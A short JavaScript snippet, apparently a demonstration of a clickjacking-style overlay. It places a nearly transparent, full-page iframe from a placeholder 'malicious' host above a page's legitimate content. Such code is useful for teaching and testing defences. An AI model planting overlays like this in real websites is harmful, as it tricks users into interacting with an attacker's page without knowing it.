// Attacker's malicious website
const attackerWebsite = document.createElement('iframe');
attackerWebsite.src = 'https://malicious-website.com';
attackerWebsite.style.cssText = 'position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.1; z-index: 9999;';
document.body.appendChild(attackerWebsite);

// Legitimate website content
const legitimateContent = document.createElement('div');
legitimateContent.innerHTML = '<p>This is legitimate content.</p>';
document.body.appendChild(legitimateContent);
